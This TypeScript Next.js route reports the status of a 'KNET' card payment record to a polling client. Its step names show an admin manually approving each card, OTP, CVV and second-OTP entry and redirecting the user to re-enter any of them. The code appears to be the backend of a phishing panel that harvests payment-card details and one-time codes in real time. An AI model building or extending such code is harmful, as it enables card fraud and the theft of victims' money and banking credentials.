import { NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { KNET_REVIEW } from "@/models/knet.repository";

export const dynamic = "force-dynamic";

function mapStep(status: string, step: string): string {
  if (status === "approved") return "accepted";
  if (status === "rejected") return "rejected";

  switch (step) {
    case KNET_REVIEW.awaitingAdminCard:
    case KNET_REVIEW.awaitingAdminOtp:
    case KNET_REVIEW.awaitingAdminCvv:
    case KNET_REVIEW.awaitingAdminOtp2:
      return "pending";
    case KNET_REVIEW.otpEntry:
    case KNET_REVIEW.cvvEntry:
    case KNET_REVIEW.otp2Entry:
      return "accepted";
    case KNET_REVIEW.retryCard:
      return "redirect_card";
    case KNET_REVIEW.retryOtp:
    case KNET_REVIEW.retryOtp2:
      return "redirect_otp";
    case KNET_REVIEW.retryCvv:
      return "redirect_cvv";
    default:
      return "pending";
  }
}

export async function GET(_req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  const row = await prisma.knet.findUnique({ where: { id } });
  if (!row) return NextResponse.json({ status: "not_found" }, { status: 404 });
  return NextResponse.json({ status: mapStep(row.status, row.reviewStep) });
}
